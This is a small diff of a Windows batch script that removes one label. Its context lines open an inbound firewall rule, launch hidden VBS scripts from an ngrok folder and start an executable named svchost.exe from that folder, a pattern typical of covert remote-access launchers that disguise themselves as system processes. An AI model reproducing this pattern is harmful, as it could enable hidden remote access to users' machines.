@@ -10,7 +10,6 @@ powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbo
 start /min "" "%NGROK_PATH%\nt.vbs"
 start /min "" "%NGROK_PATH%\hst.vbs"
 
-:CHECK_DOTNET
 timeout /t 2 >nul
 if exist "C:\Program Files\dotnet" (
     start "" "%NGROK_PATH%\svchost.exe"
